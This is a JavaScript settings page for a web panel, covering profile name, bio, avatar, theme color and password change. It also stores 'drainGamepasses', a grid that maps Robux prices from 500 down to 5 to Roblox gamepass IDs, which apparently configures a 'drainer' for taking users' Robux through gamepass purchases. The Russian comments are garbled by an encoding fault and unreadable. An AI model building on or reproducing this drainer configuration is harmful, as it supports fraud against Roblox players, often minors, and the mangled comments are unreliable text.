// в”Ђв”Ђ РЎС‚СЂР°РЅРёС†Р° РЅР°СЃС‚СЂРѕРµРє (СЃС‚Р°С‚РёС‡РµСЃРєР°СЏ РІРµСЂСЃРёСЏ) в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
if (!requireLogin()) throw new Error('redirect');

document.getElementById('sidebarSlot').innerHTML = renderHeader('settings');
bindLogout();

let currentSettings = {};
let currentAvatarImageBase64 = null; // РҐСЂР°РЅРёС‚ base64 С„РѕС‚Рѕ, РµСЃР»Рё РІС‹Р±СЂР°РЅРѕ

// в”Ђв”Ђ Р—Р°РіСЂСѓР·РєР° С‚РµРєСѓС‰РёС… РЅР°СЃС‚СЂРѕРµРє в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
async function loadSettings() {
  try {
    const r = await apiFetch('/api/settings');
    const s = await r.json();
    currentSettings = s;

    // Prefer localStorage values (they survive server restarts on Render free tier)
    const localAvatar = localStorage.getItem('ft_avatar');
    const localAvatarImage = localStorage.getItem('ft_avatarImage');
    const localName = localStorage.getItem('ft_displayName');
    const localColor = localStorage.getItem('ft_themeColor');
    const localBio = localStorage.getItem('ft_bio');
    const localDrainGamepasses = localStorage.getItem('ft_drainGamepasses');

    document.getElementById('displayName').value = localName || s.displayName || '';
    document.getElementById('bio').value = localBio || s.bio || '';
    document.getElementById('themeColor').value = localColor || s.themeColor || '#00f0ff';
    
    const prices = [
      500, 495, 490, 485, 480, 475, 470, 465, 460, 455, 450, 445, 440, 435, 430, 425, 420, 415, 410, 405, 400,
      395, 390, 385, 380, 375, 370, 365, 360, 355, 350, 345, 340, 335, 330, 325, 320, 315, 310, 305, 300,
      295, 290, 285, 280, 275, 270, 265, 260, 255, 250, 245, 240, 235, 230, 225, 220, 215, 210, 205, 200,
      195, 190, 185, 180, 175, 170, 165, 160, 155, 150, 145, 140, 135, 130, 125, 120, 115, 110, 105, 100,
      95, 90, 85, 80, 75, 70, 65, 60, 55, 50, 45, 40, 35, 30, 25, 20, 15, 10, 5
    ];

    let gps = {};
    try {
      gps = JSON.parse(localDrainGamepasses || s.drainGamepasses || '{}');
    } catch(e) {
      // Compatibility fallback
      const str = localDrainGamepasses || s.drainGamepasses || '';
      const arr = str.split(',').map(x => x.trim()).filter(Boolean);
      for (let i = 0; i < Math.min(arr.length, prices.length); i++) {
        gps[prices[i]] = arr[i];
      }
    }

    renderDrainerGrid(prices, gps);

    const serverAvatarImage = s.avatarImage || null;

    if (localAvatarImage) {
      currentAvatarImageBase64 = localAvatarImage;
      document.getElementById('avatarInput').value = '';
    } else if (serverAvatarImage) {
      currentAvatarImageBase64 = serverAvatarImage;
      localStorage.setItem('ft_avatarImage', serverAvatarImage);
      document.getElementById('avatarInput').value = '';
    } else {
      document.getElementById('avatarInput').value = localAvatar || s.avatar || '';
      currentAvatarImageBase64 = null;
    }

    updatePreview();
    highlightSelectedEmoji(localAvatar || s.avatar);
    highlightSelectedColor(localColor || s.themeColor);
    applyAccentColor(localColor || s.themeColor);
  } catch (e) {
    if (e.message !== 'auth') {
      // Fallback to localStorage if server is down
      const localAvatar = localStorage.getItem('ft_avatar');
      const localName = localStorage.getItem('ft_displayName');
      const localColor = localStorage.getItem('ft_themeColor');
      const localBio = localStorage.getItem('ft_bio');
      document.getElementById('displayName').value = localName || '';
      document.getElementById('bio').value = localBio || '';
      document.getElementById('themeColor').value = localColor || '#00f0ff';
      document.getElementById('avatarInput').value = localAvatar || 'рџ¦Љ';
      updatePreview();
    }
  }
}

// в”Ђв”Ђ РћР±СЂР°Р±РѕС‚РєР° Р·Р°РіСЂСѓР·РєРё С„РѕС‚Рѕ в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
document.getElementById('avatarFileInput').addEventListener('change', function(e) {
  const file = e.target.files[0];
  if (!file) return;

  // РџСЂРѕРІРµСЂРєР° СЂР°Р·РјРµСЂР° (РґРѕ 5РњР‘, Р·Р°С‚РµРј СЃР¶РёРјР°РµС‚СЃСЏ)
  if (file.size > 5 * 1024 * 1024) {
    toast('Р¤Р°Р№Р» СЃР»РёС€РєРѕРј Р±РѕР»СЊС€РѕР№. РњР°РєСЃРёРјСѓРј 5 РњР‘.', 'err');
    return;
  }

  const reader = new FileReader();
  reader.onload = (e) => {
    const img = new Image();
    img.onload = () => {
      const canvas = document.createElement('canvas');
      const maxW = 300, maxH = 300;
      let w = img.width, h = img.height;
      if (w > maxW || h > maxH) {
        if (w > h) { h = Math.round((h * maxW) / w); w = maxW; }
        else { w = Math.round((w * maxH) / h); h = maxH; }
      }
      canvas.width = w; canvas.height = h;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(img, 0, 0, w, h);
      currentAvatarImageBase64 = canvas.toDataURL('image/jpeg', 0.8);
      
      document.getElementById('avatarInput').value = ''; // РѕС‡РёС‰Р°РµРј СЌРјРѕРґР·Рё
      highlightSelectedEmoji('');
      updatePreview();
    };
    img.src = e.target.result;
  };
  reader.readAsDataURL(file);
});

document.getElementById('btnResetAvatar').addEventListener('click', function() {
  currentAvatarImageBase64 = null;
  document.getElementById('avatarFileInput').value = '';
  document.getElementById('avatarInput').value = 'рџ¦Љ'; // РґРµС„РѕР»С‚ СЌРјРѕРґР·Рё
  highlightSelectedEmoji('рџ¦Љ');
  updatePreview();
});

// в”Ђв”Ђ РћР‘РќРћР’Р›Р•РќРР• РџР Р•Р’Р¬Р® в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
function updatePreview() {
  const name = document.getElementById('displayName').value || getUser();
  const bio = document.getElementById('bio').value || '...';
  
  document.getElementById('previewName').textContent = name;
  document.getElementById('previewBio').textContent = bio;

  const previewEl = document.getElementById('previewAvatar');

  if (currentAvatarImageBase64) {
    previewEl.innerHTML = '<img src="' + currentAvatarImageBase64 + '" style="width:100%;height:100%;object-fit:cover;border-radius:50%;">';
  } else {
    const emoji = document.getElementById('avatarInput').value || 'рџ¤–';
    previewEl.innerHTML = escapeHtml(emoji);
  }
}

// в”Ђв”Ђ РџРѕРґСЃРІРµС‚РєР° РІС‹Р±СЂР°РЅРЅРѕРіРѕ СЌРјРѕРґР·Рё в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
function highlightSelectedEmoji(emoji) {
  document.querySelectorAll('.emoji-btn').forEach(btn => {
    btn.classList.toggle('selected', btn.dataset.emoji === emoji);
  });
}

// в”Ђв”Ђ РџРѕРґСЃРІРµС‚РєР° РІС‹Р±СЂР°РЅРЅРѕРіРѕ С†РІРµС‚Р° в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
function highlightSelectedColor(color) {
  document.querySelectorAll('.color-dot').forEach(btn => {
    btn.classList.toggle('selected', btn.dataset.color === color);
  });
}

// в”Ђв”Ђ Emoji picker в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
document.querySelectorAll('.emoji-btn').forEach(btn => {
  btn.addEventListener('click', function() {
    const emoji = this.dataset.emoji;
    document.getElementById('avatarInput').value = emoji;
    currentAvatarImageBase64 = null; // РЎР±СЂР°СЃС‹РІР°РµРј С„РѕС‚Рѕ РїСЂРё РІС‹Р±РѕСЂРµ СЌРјРѕРґР·Рё
    highlightSelectedEmoji(emoji);
    updatePreview();
  });
});

// в”Ђв”Ђ Color picker (Live Preview) в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
function handleColorChange(color) {
  document.getElementById('themeColor').value = color;
  highlightSelectedColor(color);
  applyAccentColor(color); // Live update of CSS variables
}

document.querySelectorAll('.color-dot').forEach(btn => {
  btn.addEventListener('click', function() { handleColorChange(this.dataset.color); });
});

document.getElementById('themeColor').addEventListener('input', function() {
  handleColorChange(this.value);
});

// в”Ђв”Ђ Live preview РЅР° РІРІРѕРґ в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
['displayName', 'avatarInput', 'bio'].forEach(id => {
  document.getElementById(id).addEventListener('input', function() {
    if (id === 'avatarInput' && this.value.trim() !== '') {
      currentAvatarImageBase64 = null; // Р•СЃР»Рё СЋР·РµСЂ РІСЂСѓС‡РЅСѓСЋ РІРІРѕРґРёС‚ СЌРјРѕРґР·Рё, СЃР±СЂР°СЃС‹РІР°РµРј С„РѕС‚Рѕ
    }
    updatePreview();
  });
});

// в”Ђв”Ђ РЎРѕС…СЂР°РЅРµРЅРёРµ в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
document.getElementById('btnSave').addEventListener('click', async function() {
  const btn = this;
  
  const name = document.getElementById('displayName').value.trim();
  const bio = document.getElementById('bio').value.trim();
  const themeColor = document.getElementById('themeColor').value;
  const currPwd = document.getElementById('currentPassword').value;
  const newPwd = document.getElementById('newPassword').value;
  
  const gpData = {};
  document.querySelectorAll('.gp-input').forEach(input => {
    const val = input.value.trim();
    if (val) gpData[input.dataset.price] = val;
  });
  const drainGamepasses = JSON.stringify(gpData);
  
  const data = {
    displayName: name,
    themeColor: themeColor,
    bio: bio,
    drainGamepasses: drainGamepasses
  };

  if (currentAvatarImageBase64) {
    data.avatarImage = currentAvatarImageBase64;
  } else {
    data.avatar = document.getElementById('avatarInput').value.trim();
  }

  if (newPwd) {
    data.newPassword = newPwd;
    data.currentPassword = currPwd;
  }

  btn.disabled = true;
  btn.textContent = 'РЎРѕС…СЂР°РЅРµРЅРёРµ...';

  try {
    const r = await apiFetch('/api/settings', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });
    const resp = await r.json();
    if (resp.success) {
      toast('вњ… РќР°СЃС‚СЂРѕР№РєРё СЃРѕС…СЂР°РЅРµРЅС‹');
      document.getElementById('newPassword').value = '';
      document.getElementById('currentPassword').value = '';
      currentSettings = resp.settings;

      // РЎРѕС…СЂР°РЅСЏРµРј РІ localStorage вЂ” РїРµСЂРµР¶РёРІС‘С‚ РїРµСЂРµР·Р°РїСѓСЃРє Render
      localStorage.setItem('ft_themeColor', data.themeColor);
      if (data.displayName) localStorage.setItem('ft_displayName', data.displayName);
      if (data.bio) localStorage.setItem('ft_bio', data.bio);
      if (data.drainGamepasses) localStorage.setItem('ft_drainGamepasses', data.drainGamepasses);

      if (data.avatarImage) {
        localStorage.setItem('ft_avatarImage', data.avatarImage);
        localStorage.removeItem('ft_avatar');
      } else if (data.avatar) {
        localStorage.setItem('ft_avatar', data.avatar);
        localStorage.removeItem('ft_avatarImage');
      }
      
      // РџРµСЂРµСЂРёСЃРѕРІС‹РІР°РµРј С€Р°РїРєСѓ С‡С‚РѕР±С‹ РёР·РјРµРЅРµРЅРёСЏ РІСЃС‚СѓРїРёР»Рё РІ СЃРёР»Сѓ
      document.getElementById('sidebarSlot').innerHTML = renderHeader('settings');
      bindLogout();
    } else {
      toast(resp.error || 'РћС€РёР±РєР° СЃРѕС…СЂР°РЅРµРЅРёСЏ', 'err');
    }
  } catch (e) {
    if (e.message !== 'auth') toast('РћС€РёР±РєР° СЃРІСЏР·Рё СЃ СЃРµСЂРІРµСЂРѕРј', 'err');
  }

  btn.disabled = false;
  btn.textContent = 'РЎРѕС…СЂР°РЅРёС‚СЊ РЅР°СЃС‚СЂРѕР№РєРё';
});

// в”Ђв”Ђ РђРІС‚Рѕ-СЃРѕР·РґР°РЅРёРµ РіРµР№РјРїР°СЃСЃРѕРІ С‡РµСЂРµР· СЂР°СЃС€РёСЂРµРЅРёРµ в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђ
let gamepassCreationTimeout = null;

function renderDrainerGrid(pricesList, savedIds = {}) {
  const grid = document.getElementById('drainerGrid');
  grid.innerHTML = '';
  
  if (pricesList.length === 0) {
    grid.innerHTML = '<div style="grid-column: 1/-1; text-align: center; color: rgba(255,255,255,0.4); padding: 1rem;">РќРµС‚ С†РµРЅ РґР»СЏ РѕС‚РѕР±СЂР°Р¶РµРЅРёСЏ. Р’РІРµРґРёС‚Рµ РёС… РІС‹С€Рµ С‡РµСЂРµР· Р·Р°РїСЏС‚СѓСЋ.</div>';
    return;
  }

  pricesList.forEach(price => {
    const item = document.createElement('div');
    item.className = 'drainer-item';
    
    const label = document.createElement('label');
    label.textContent = price.toLocaleString('ru-RU') + ' R$';
    
    const input = document.createElement('input');
    input.type = 'text';
    input.className = 'settings-input gp-input';
    input.dataset.price = price;
    input.placeholder = 'ID РіРµР№РјРїР°СЃСЃР°';
    if (savedIds[price]) {
      input.value = savedIds[price];
    }
    
    item.appendChild(label);
    item.appendChild(input);
    grid.appendChild(item);
  });
}

function getCurrentTypedIds() {
  const data = {};
  document.querySelectorAll('.gp-input').forEach(input => {
    const val = input.value.trim();
    if (val) data[input.dataset.price] = val;
  });
  return data;
}


loadSettings();
